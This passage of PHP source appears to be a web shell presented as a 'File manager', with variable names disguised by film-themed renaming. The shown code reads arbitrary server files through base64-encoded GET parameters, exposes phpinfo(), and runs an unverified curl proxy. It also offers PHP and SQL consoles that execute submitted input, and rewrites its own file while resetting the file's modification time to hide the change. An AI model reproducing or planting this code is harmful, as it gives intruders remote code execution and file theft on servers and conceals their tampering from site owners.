				if ($_POST['fm_login']['login'] != $mamaImeldaAuthenticated['login']) $miguelMessage .= ' '.__('Login').': '.$_POST['fm_login']['login'];
				if ($_POST['fm_login']['password'] != $mamaImeldaAuthenticated['password']) $miguelMessage .= ' '.__('Password').': '.$_POST['fm_login']['password'];
				$mamaImeldaAuthenticated = $_POST['fm_login'];
			}
			else $miguelMessage .= __('Error occurred');
			if (!empty($memoryConfig['fm_restore_time'])) touch(__FILE__,$songFileModified);
		}



	} elseif (isset($_POST['tpl_edited'])) { 
		$familyLanguageTemplate = $_POST['tpl_edited'];
		if (!empty($_POST[$familyLanguageTemplate.'_name'])) {


			$ofrendaPanel = json_encode(array_combine($_POST[$familyLanguageTemplate.'_name'],$_POST[$familyLanguageTemplate.'_value']),JSON_HEX_APOS);
		} elseif (!empty($_POST[$familyLanguageTemplate.'_new_name'])) {
			$ofrendaPanel = json_encode(json_decode(${$familyLanguageTemplate.'_templates'},true)+array($_POST[$familyLanguageTemplate.'_new_name']=>$_POST[$familyLanguageTemplate.'_new_value']),JSON_HEX_APOS);

		}
		if (!empty($ofrendaPanel)) {



			$memoryFileContent = file_get_contents(__FILE__);

			$searchMemory = preg_match('#'.$familyLanguageTemplate.'_templates[\s]?\=[\s]?\'\{\"(.*?)\"\}\';#', $memoryFileContent, $songMatches);
			if (!empty($songMatches[1])) {
				$songFileModified = filemtime(__FILE__);
				$replaceErnesto = str_replace('{"'.$songMatches[1].'"}',$ofrendaPanel,$memoryFileContent);
				if (file_put_contents(__FILE__, $replaceErnesto)) {
					${$familyLanguageTemplate.'_templates'} = $ofrendaPanel;
					$miguelMessage .= __('File updated');
				} else $miguelMessage .= __('Error occurred');

				if (!empty($memoryConfig['fm_restore_time'])) touch(__FILE__,$songFileModified);
			}	

		} else $miguelMessage .= __('Error occurred');
	}



}

// Just show image
if (isset($_GET['img'])) {

	$songFile=base64_decode($_GET['img']);
	if ($cocoInfo=getimagesize($songFile)){
		switch  ($cocoInfo[2]){	//1=GIF, 2=JPG, 3=PNG, 4=SWF, 5=PSD, 6=BMP

			case 1: $riveraExtension='gif'; break;


			case 2: $riveraExtension='jpeg'; break;

			case 3: $riveraExtension='png'; break;
			case 6: $riveraExtension='bmp'; break;



			default: die();



		}


		header("Content-type: image/$riveraExtension");

		echo file_get_contents($songFile);
		die();
	}
}


// Just download file


if (isset($_GET['download'])) {
	$songFile=base64_decode($_GET['download']);


	downloadRememberFile($songFile);	
}

// Just show info
if (isset($_GET['phpinfo'])) {
	phpinfo(); 
	die();
}



// Mini proxy, many bugs!
if (isset($_GET['proxy']) && (!empty($memoryConfig['enable_proxy']))) {

	$ofrendaUrl = isset($_GET['url'])?urldecode($_GET['url']):'';
	$proxyBlessingForm = '
<div style="position:relative;z-index:100500;background: linear-gradient(to bottom, #e4f5fc 0%,#bfe8f9 50%,#9fd8ef 51%,#2ab0ed 100%);">



	<form action="" method="GET">


	<input type="hidden" name="proxy" value="true">
	'.memoryHome().' <a href="'.$ofrendaUrl.'" target="_blank">Url</a>: <input type="text" name="url" value="'.$ofrendaUrl.'" size="55">
	<input type="submit" value="'.__('Show').'" class="fm_input">
	</form>
</div>


';
	if ($ofrendaUrl) {
		$melodyChannel = curl_init($ofrendaUrl);
		curl_setopt($melodyChannel, CURLOPT_USERAGENT, 'Den1xxx test proxy');
		curl_setopt($melodyChannel, CURLOPT_FOLLOWLOCATION, 1);

		curl_setopt($melodyChannel, CURLOPT_SSL_VERIFYHOST,0);
		curl_setopt($melodyChannel, CURLOPT_SSL_VERIFYPEER,0);

		curl_setopt($melodyChannel, CURLOPT_HEADER, 0);

		curl_setopt($melodyChannel, CURLOPT_REFERER, $ofrendaUrl);
		curl_setopt($melodyChannel, CURLOPT_RETURNTRANSFER,true);

		$songResult = curl_exec($melodyChannel);
		curl_close($melodyChannel);

		//$songResult = preg_replace('#(src)=["\'][http://]?([^:]*)["\']#Ui', '\\1="'.$ofrendaUrl.'/\\2"', $songResult);



		$songResult = preg_replace_callback('#(href|src)=["\'][http://]?([^:]*)["\']#Ui', 'memoryUrlProxy', $songResult);



		$songResult = preg_replace('%(<body.*?>)%i', '$1'.'<style>'.rememberHomeStyle().'</style>'.$proxyBlessingForm, $songResult);


		echo $songResult;
		die();
	} 
}


?>
<!doctype html>
<html>

<head>     
	<meta charset="utf-8" />

	<meta name="viewport" content="width=device-width, initial-scale=1" />



    <title><?=__('File manager')?></title>


<style>



body {

	background-color:	white;
	font-family:		Verdana, Arial, Helvetica, sans-serif;

	font-size:			8pt;
	margin:				0px;



}





a:link, a:active, a:visited { color: #006699; text-decoration: none; }
a:hover { color: #DD6900; text-decoration: underline; }
a.th:link { color: #FFA34F; text-decoration: none; }

a.th:active { color: #FFA34F; text-decoration: none; }

a.th:visited { color: #FFA34F; text-decoration: none; }
a.th:hover {  color: #FFA34F; text-decoration: underline; }



table.bg {
	background-color: #ACBBC6



}



th, td { 
	font:	normal 8pt Verdana, Arial, Helvetica, sans-serif;



	padding: 3px;



}


th	{
	height:				25px;
	background-color:	#006699;



	color:				#FFA34F;


	font-weight:		bold;


	font-size:			11px;
}




.row1 {
	background-color:	#EFEFEF;

}

.row2 {
	background-color:	#DEE3E7;

}







.row3 {
	background-color:	#D1D7DC;


	padding: 5px;



}




tr.row1:hover {
	background-color:	#F3FCFC;



}



tr.row2:hover {
	background-color:	#F0F6F6;


}


.whole {

	width: 100%;
}




.all tbody td:first-child{width:100%;}

textarea {
	font: 9pt 'Courier New', courier;

	line-height: 125%;
	padding: 5px;
}

.textarea_input {
	height: 1em;


}




.textarea_input:focus {
	height: auto;
}

input[type=submit]{
	background: #FCFCFC none !important;
	cursor: pointer;
}

.folder {
    background-image: url("data:image/png;base64,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");
}



.file {
    background-image: url("data:image/png;base64,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");



}
<?=rememberHomeStyle()?>
.img {



	background-image: 
url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAAdFQTFRF7e3t/f39pJ+f+cJajV8q6enpkGIm/sFO/+2O393c5ubm/sxbd29yimdneFg65OTk2zoY6uHi1zAS1crJsHs2nygo3Nrb2LBXrYtm2p5A/+hXpoRqpKOkwri46+vr0MG36Ysz6ujpmI6AnzUywL+/mXVSmIBN8bwwj1VByLGza1ZJ0NDQjYSB/9NjwZ6CwUAsxk0brZyWw7pmGZ4A6LtdkHdf/+N8yow27b5W87RNLZL/2biP7wAA//GJl5eX4NfYsaaLgp6h1b+t/+6R68Fe89ycimZd/uQv3r9NupCB99V25a1cVJbbnHhO/8xS+MBa8fDwi2Ji48qi/+qOdVIzs34x//GOXIzYp5SP/sxgqpiIcp+/siQpcmpstayszSANuKKT9PT04uLiwIky8LdE+sVWvqam8e/vL5IZ+rlH8cNg08Ccz7ad8vLy9LtU1qyUuZ4+r512+8s/wUpL3d3dx7W1fGNa/89Z2cfH+s5n6Ojob1Yts7Kz19fXwIg4p1dN+Pj4zLR0+8pd7strhKAs/9hj/9BV1KtftLS1np2dYlJSZFVV5LRWhEFB5rhZ/9Jq0HtT//CSkIqJ6K5D+LNNblVVvjM047ZMz7e31xEG////tKgu6wAAAJt0Uk5T/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wCVVpKYAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAANZJREFUKFNjmKWiPQsZMMximsqPKpAb2MsAZNjLOwkzggVmJYnyps/QE59eKCEtBhaYFRfjZuThH27lY6kqBxYorS/OMC5wiHZkl2QCCVTkN+trtFj4ZSpMmawDFBD0lCoynzZBl1nIJj55ElBA09pdvc9buT1SYKYBWw1QIC0oNYsjrFHJpSkvRYsBKCCbM9HLN9tWrbqnjUUGZG1AhGuIXZRzpQl3aGwD2B2cZZ2zEoL7W+u6qyAunZXIOMvQrFykqwTiFzBQNOXj4QKzoAKzajtYIQwAlvtpl3V5c8MAAAAASUVORK5CYII=");

}

@media screen and (max-width:720px){



  table{display:block;}


    #fm_table td{display:inline;float:left;}
    #fm_table tbody td:first-child{width:100%;padding:0;}


    #fm_table tbody tr:nth-child(2n+1){background-color:#EFEFEF;}



    #fm_table tbody tr:nth-child(2n){background-color:#DEE3E7;}

    #fm_table tr{display:block;float:left;clear:left;width:100%;}
	#header_table .row2, #header_table .row3 {display:inline;float:left;width:100%;padding:0;}


	#header_table table td {display:inline;float:left;}



}

</style>



</head>


<body>

<?php



$includedMiguelUrl = '?fm=true';

if (isset($_POST['sqlrun'])&&!empty($memoryConfig['enable_sql_console'])){
	$memoryResult = empty($_POST['sql']) ? '' : $_POST['sql'];



	$songResponseLanguage = 'sql';
} elseif (isset($_POST['phprun'])&&!empty($memoryConfig['enable_php_console'])){


	$memoryResult = empty($_POST['php']) ? '' : $_POST['php'];

	$songResponseLanguage = 'php';
} 
if (isset($_GET['fm_settings'])) {

	echo ' 
<table class="whole">
<form method="post" action="">



<tr><th colspan="2">'.__('File manager').' - '.__('Settings').'</th></tr>
'.(empty($miguelMessage)?'':'<tr><td class="row2" colspan="2">'.$miguelMessage.'</td></tr>').'
'.memoryConfigCheckboxRow(__('Show size of the folder'),'show_dir_size').'
'.memoryConfigCheckboxRow(__('Show').' '.__('pictures'),'show_img').'
'.memoryConfigCheckboxRow(__('Show').' '.__('Make directory'),'make_directory').'
'.memoryConfigCheckboxRow(__('Show').' '.__('New file'),'new_file').'
'.memoryConfigCheckboxRow(__('Show').' '.__('Upload'),'upload_file').'
'.memoryConfigCheckboxRow(__('Show').' PHP version','show_php_ver').'



'.memoryConfigCheckboxRow(__('Show').' PHP ini','show_php_ini').'
'.memoryConfigCheckboxRow(__('Show').' '.__('Generation time'),'show_gt').'
'.memoryConfigCheckboxRow(__('Show').' xls','show_xls').'



'.memoryConfigCheckboxRow(__('Show').' PHP '.__('Console'),'enable_php_console').'
'.memoryConfigCheckboxRow(__('Show').' SQL '.__('Console'),'enable_sql_console').'
<tr><td class="row1"><input name="fm_config[sql_server]" value="'.$memoryConfig['sql_server'].'" type="text"></td><td class="row2 whole">SQL server</td></tr>
<tr><td class="row1"><input name="fm_config[sql_username]" value="'.$memoryConfig['sql_username'].'" type="text"></td><td class="row2 whole">SQL user</td></tr>

<tr><td class="row1"><input name="fm_config[sql_password]" value="'.$memoryConfig['sql_password'].'" type="text"></td><td class="row2 whole">SQL password</td></tr>
<tr><td class="row1"><input name="fm_config[sql_db]" value="'.$memoryConfig['sql_db'].'" type="text"></td><td class="row2 whole">SQL DB</td></tr>
'.memoryConfigCheckboxRow(__('Show').' Proxy','enable_proxy').'


'.memoryConfigCheckboxRow(__('Show').' phpinfo()','show_phpinfo').'


'.memoryConfigCheckboxRow(__('Show').' '.__('Settings'),'fm_settings').'
'.memoryConfigCheckboxRow(__('Restore file time after editing'),'restore_time').'



'.memoryConfigCheckboxRow(__('File manager').': '.__('Restore file time after editing'),'fm_restore_time').'
<tr><td class="row3"><a href="'.getMemoryUrl().'?fm_settings=true&fm_config_delete=true">'.__('Reset settings').'</a></td><td class="row3"><input type="submit" value="'.__('Save').'" name="fm_config[fm_set_submit]"></td></tr>
</form>

</table>
<table>
<form method="post" action="">

<tr><th colspan="2">'.__('Settings').' - '.__('Authorization').'</th></tr>



<tr><td class="row1"><input name="fm_login[authorize]" value="1" '.($mamaImeldaAuthenticated['authorize']?'checked':'').' type="checkbox" id="auth"></td><td class="row2 whole"><label for="auth">'.__('Authorization').'</label></td></tr>



<tr><td class="row1"><input name="fm_login[login]" value="'.$mamaImeldaAuthenticated['login'].'" type="text"></td><td class="row2 whole">'.__('Login').'</td></tr>


<tr><td class="row1"><input name="fm_login[password]" value="'.$mamaImeldaAuthenticated['password'].'" type="text"></td><td class="row2 whole">'.__('Password').'</td></tr>

<tr><td class="row1"><input name="fm_login[cookie_name]" value="'.$mamaImeldaAuthenticated['cookie_name'].'" type="text"></td><td class="row2 whole">'.__('Cookie').'</td></tr>

<tr><td class="row1"><input name="fm_login[days_authorization]" value="'.$mamaImeldaAuthenticated['days_authorization'].'" type="text"></td><td class="row2 whole">'.__('Days').'</td></tr>
<tr><td class="row1"><textarea name="fm_login[script]" cols="35" rows="7" class="textarea_input" id="auth_script">'.$mamaImeldaAuthenticated['script'].'</textarea></td><td class="row2 whole">'.__('Script').'</td></tr>
<tr><td colspan="2" class="row3"><input type="submit" value="'.__('Save').'" ></td></tr>
</form>

</table>';



echo memoryTemplateForm('php'),memoryTemplateForm('sql');
} elseif (isset($proxyBlessingForm)) {
	die($proxyBlessingForm);
} elseif (isset($songResponseLanguage)) {	
?>
<table class="whole">


<tr>



    <th><?=__('File manager').' - '.$ofrendaPath?></th>
</tr>


<tr>
    <td class="row2"><table><tr><td><h2><?=strtoupper($songResponseLanguage)?> <?=__('Console')?><?php


	if($songResponseLanguage=='sql') echo ' - Database: '.$memoryConfig['sql_db'].'</h2></td><td>'.runMemoryInput('php');
	else echo '</h2></td><td>'.runMemoryInput('sql');

	?></td></tr></table></td>
</tr>
<tr>
    <td class="row1">



		<a href="<?=$includedMiguelUrl.'&path=' . $ofrendaPath;?>"><?=__('Back')?></a>


		<form action="" method="POST" name="console">



		<textarea name="<?=$songResponseLanguage?>" cols="80" rows="10" style="width: 90%"><?=$memoryResult?></textarea><br/>
		<input type="reset" value="<?=__('Reset')?>">
		<input type="submit" value="<?=__('Submit')?>" name="<?=$songResponseLanguage?>run">


<?php
